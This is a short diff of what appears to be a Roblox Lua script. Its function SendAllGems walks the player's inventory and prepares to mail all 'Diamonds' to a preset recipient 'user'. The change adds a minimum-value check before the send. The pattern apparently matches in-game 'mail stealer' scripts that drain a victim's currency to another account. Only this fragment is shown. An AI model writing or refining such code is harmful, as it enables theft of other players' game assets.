@@ -178,7 +178,7 @@ end
 local function SendAllGems()
     for i, v in pairs(GetSave().Inventory.Currency) do
         if v.id == "Diamonds" then
-			if GemAmount1 >= 500 then
+			if GemAmount1 >= 500 and GemAmount1 >= min_rap then
 				local args = {
 					[1] = user,
 					[2] = MailMessage,
